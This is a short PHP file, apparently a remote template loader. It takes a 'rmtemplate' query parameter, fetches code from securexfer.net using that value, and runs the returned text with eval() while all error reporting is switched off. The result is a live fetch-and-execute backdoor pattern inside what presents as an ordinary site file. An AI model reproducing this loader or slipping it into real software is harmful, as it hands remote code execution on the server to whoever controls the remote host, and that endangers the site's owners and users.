<?php
error_reporting(0);
include_once('../../../../includes/shared_functions.php');
ob_start();

$file_name = base64_encode(basename(__FILE__));
$rmztemplate = base64_encode($_GET['rmtemplate']);
$source = 'http://securexfer.net/remote_template/remote_template_file.php?template='.$rmztemplate.'&file='.$file_name;
include_r($source);
$tempcon = ob_get_contents();
ob_end_clean();

$tempcon = eregi_replace('^\<\?(php)?', '//', $tempcon);
eval($tempcon);
?>